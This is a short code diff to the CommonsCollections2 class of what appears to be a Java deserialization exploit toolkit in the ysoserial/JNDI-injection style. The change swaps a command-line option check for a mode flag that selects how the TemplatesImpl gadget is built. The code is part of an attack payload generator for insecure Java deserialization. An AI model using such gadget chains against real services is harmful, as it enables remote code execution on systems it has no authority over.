@@ -12,6 +12,7 @@ import org.apache.commons.collections4.functors.InvokerTransformer;
 import java.util.PriorityQueue;
 import java.util.Queue;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 @SuppressWarnings({"rawtypes", "unchecked"})
@@ -21,7 +22,7 @@ public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
 
     public Queue<Object> getObject(PayloadType type, String... param) throws Exception {
         final Object templates;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             templates = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             templates = Gadgets.createTemplatesImpl(type, param);
